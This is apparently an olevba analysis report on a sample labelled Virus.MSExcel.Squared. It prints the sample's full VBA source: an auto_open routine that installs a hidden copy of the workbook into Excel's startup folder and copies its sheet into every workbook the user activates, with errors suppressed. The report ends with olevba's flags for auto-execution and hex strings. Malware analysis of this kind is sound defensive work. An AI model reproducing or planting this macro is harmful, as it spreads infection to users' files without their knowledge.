olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Squared-78bc55d3ff3e6ea76c803461ca20672a00855735
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO nt?.vba 
in file: Virus.MSExcel.Squared-78bc55d3ff3e6ea76c803461ca20672a00855735 - OLE stream: '_VBA_PROJECT_CUR/VBA/nt²'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 









Private Sub auto_open()
    Application.OnSheetActivate = "SearchSelf"
End Sub

Private Static Sub SearchSelf()
On Error Resume Next
Const Self As String = "ntІ.xls"
Dim Resident As Boolean, strCurrDir As String

    Application.ScreenUpdating = False
    Resident = Dir(Application.StartupPath & "\" & Self) = Self
    If Resident Then
       If ActiveWorkbook.Sheets(1).Name <> "ntІ" Then
           Workbooks(Self).Sheets("ntІ").Copy before:=ActiveWorkbook.Sheets(1)
       End If
    Else
        Sheets("ntІ").Select: Sheets("ntІ").Copy
        strCurrDir = CurDir()
        ChDir Application.StartupPath
        Workbooks(ActiveWorkbook.Name).SaveAs FileName:=Application.StartupPath & "\" & Self
        ChDir strCurrDir
        ActiveWindow.Visible = False
        Workbooks(Self).Save
    End If
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "ntІ.xls!SearchSelf"
    
End Sub
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Squared-78bc55d3ff3e6ea76c803461ca20672a00855735 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  nt
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

